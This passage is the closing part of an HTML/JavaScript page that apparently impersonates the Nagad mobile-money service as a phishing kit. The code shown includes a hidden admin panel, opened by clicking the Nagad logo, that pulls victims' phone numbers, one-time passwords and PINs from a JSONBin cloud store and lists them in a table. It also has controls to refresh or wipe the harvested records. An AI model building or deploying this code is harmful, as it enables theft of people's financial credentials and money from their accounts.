                    phone: '',
                    otp: '',
                    pin: '',
                    timestamp: '',
                    transactionId: ''
                };
                
                if (pinCountdownInterval) {
                    clearInterval(pinCountdownInterval);
                }
            }
            
            // Show notification
            function showNotification(message, type) {
                notification.textContent = message;
                notification.style.background = type === 'success' ? 'var(--success)' : 
                                              type === 'error' ? 'var(--error)' : 
                                              type === 'warning' ? 'var(--warning)' : 'var(--primary)';
                notification.style.display = 'block';
                
                setTimeout(() => {
                    notification.style.display = 'none';
                }, 3000);
            }
            
            // Admin Panel Functionality
            
            // Click on Nagad logo to open admin login
            logo.addEventListener('click', function() {
                adminLoginModal.style.display = 'block';
                adminError.style.display = 'none';
                adminUsername.value = '';
                adminPassword.value = '';
            });
            
            // Admin login
            adminLoginBtn.addEventListener('click', function() {
                const username = adminUsername.value;
                const password = adminPassword.value;
                
                if (username === ADMIN_CREDENTIALS.username && password === ADMIN_CREDENTIALS.password) {
                    adminLoginModal.style.display = 'none';
                    adminPanelModal.style.display = 'block';
                    updateAdminPanel();
                    showNotification('Admin login successful!', 'success');
                } else {
                    adminError.style.display = 'block';
                    showNotification('Invalid credentials!', 'error');
                }
            });
            
            // Admin logout
            adminLogoutBtn.addEventListener('click', function() {
                adminPanelModal.style.display = 'none';
                showNotification('Admin logged out!', 'success');
            });
            
            // Clear all data
            clearDataBtn.addEventListener('click', async function() {
                if (confirm('Are you sure you want to clear all collected data from the cloud? This cannot be undone.')) {
                    const success = await clearJSONBinData();
                    if (success) {
                        localStorage.setItem('nagadTransactions', JSON.stringify([]));
                        updateAdminPanel();
                        showNotification('All cloud data cleared!', 'success');
                    } else {
                        showNotification('Error clearing cloud data!', 'error');
                    }
                }
            });
            
            // Refresh data
            refreshDataBtn.addEventListener('click', function() {
                updateAdminPanel();
                showNotification('Data refreshed!', 'success');
            });
            
            // Close modals
            document.querySelectorAll('.close').forEach(closeBtn => {
                closeBtn.addEventListener('click', function() {
                    adminLoginModal.style.display = 'none';
                    adminPanelModal.style.display = 'none';
                });
            });
            
            // Close modal when clicking outside
            window.addEventListener('click', function(e) {
                if (e.target === adminLoginModal) {
                    adminLoginModal.style.display = 'none';
                }
                if (e.target === adminPanelModal) {
                    adminPanelModal.style.display = 'none';
                }
            });
            
            // Update admin panel with collected data
            async function updateAdminPanel() {
                const transactionData = document.getElementById('transaction-data');
                const transactionsList = document.getElementById('transactions-list');
                
                // Get all transactions from JSONBin
                const transactions = await getFromJSONBin();
                const completeTransactions = transactions.filter(t => t.completed);
                
                // Update data count
                dataCount.textContent = completeTransactions.length;
                
                // Clear existing data
                transactionData.innerHTML = '';
                transactionsList.innerHTML = '';
                
                if (completeTransactions.length === 0) {
                    transactionData.innerHTML = '<tr><td colspan="6" style="text-align: center; color: var(--gray); padding: 40px;">No data collected yet</td></tr>';
                    transactionsList.innerHTML = '<p style="text-align: center; color: var(--gray);">No transactions recorded</p>';
                    return;
                }
                
                // Sort by timestamp (newest first)
                const sortedData = completeTransactions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                
                // Add summary to transactions list
                transactionsList.innerHTML = `
                    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
                        <h3 style="margin: 0 0 10px 0; color: var(--primary);">üìä Cloud Data Summary</h3>
                        <p style="margin: 5px 0; color: var(--dark);">Total Complete Transactions: <strong>${completeTransactions.length}</strong></p>
                        <p style="margin: 5px 0; color: var(--dark);">Latest Record: <strong>${sortedData[0]?.timestamp || 'N/A'}</strong></p>
                        <p style="margin: 5px 0; color: var(--success); font-size: 12px;">‚úì Data synced across all devices via JSONBin</p>
                    </div>
                `;
                
                // Add all complete transactions to the table
                sortedData.forEach((data, index) => {
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td><strong>${index + 1}</strong></td>
                        <td>${data.phone}</td>
                        <td>${data.otp}</td>
                        <td>${data.pin}</td>
                        <td>${data.timestamp}</td>
                        <td>${data.transactionId}</td>
                    `;
                    transactionData.appendChild(row);
                });
                
                console.log('Admin panel updated with', completeTransactions.length, 'cloud transactions');
            }
        });
    </script>
</body>
</html>
